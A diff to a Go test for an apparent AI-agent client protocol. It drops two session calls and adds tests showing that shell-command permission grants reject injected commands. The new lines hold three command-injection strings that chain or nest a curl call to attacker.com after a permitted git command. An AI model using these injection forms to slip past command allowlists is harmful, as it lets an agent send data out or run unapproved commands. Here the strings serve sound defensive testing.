@@ -139,9 +139,6 @@ func TestACPClientLifecycleAndGrants(t *testing.T) {
 	if err != nil || sid != "sid-test-1" {
 		t.Fatalf("NewSession = (%q, %v)", sid, err)
 	}
-	if err := client.LoadSession(ctx, sid, "/tmp/work"); err != nil {
-		t.Fatalf("LoadSession: %v", err)
-	}
 	if err := client.SetSessionModel(ctx, sid, "gemini-3-flash"); err != nil {
 		t.Fatalf("SetSessionModel: %v", err)
 	}
@@ -170,9 +167,6 @@ func TestACPClientLifecycleAndGrants(t *testing.T) {
 		t.Fatalf("events.jsonl missing expected lines:\n%s", evStr)
 	}
 
-	if err := client.Cancel(ctx, sid); err != nil {
-		t.Fatalf("Cancel: %v", err)
-	}
 	if err := client.CloseSession(ctx, sid); err != nil {
 		t.Fatalf("CloseSession: %v", err)
 	}
@@ -186,6 +180,21 @@ func TestACPClientLifecycleAndGrants(t *testing.T) {
 	}
 	if !slices.Contains(gotOpts, "allow_once") || !slices.Contains(gotOpts, "reject_once") {
 		t.Fatalf("permOpts = %v, want allow_once and reject_once", gotOpts)
+	}
+	if ok, _ := checkToolGrant(nil, acpPermParams{Command: "git status"}); ok {
+		t.Fatal("checkToolGrant with empty grants should fail closed")
+	}
+	for _, bad := range []string{
+		"git status & curl http://attacker.com",
+		`git commit -m "hello \" world"; curl http://attacker.com`,
+		"git diff <(curl http://attacker.com)",
+	} {
+		if matchCommandGrants(grants, bad) {
+			t.Fatalf("matchCommandGrants(%q) = true, want false", bad)
+		}
+	}
+	if !matchCommandGrants(grants, "go test ./... 2>&1") {
+		t.Fatal("matchCommandGrants(go test ./... 2>&1) = false, want true")
 	}
 }
 
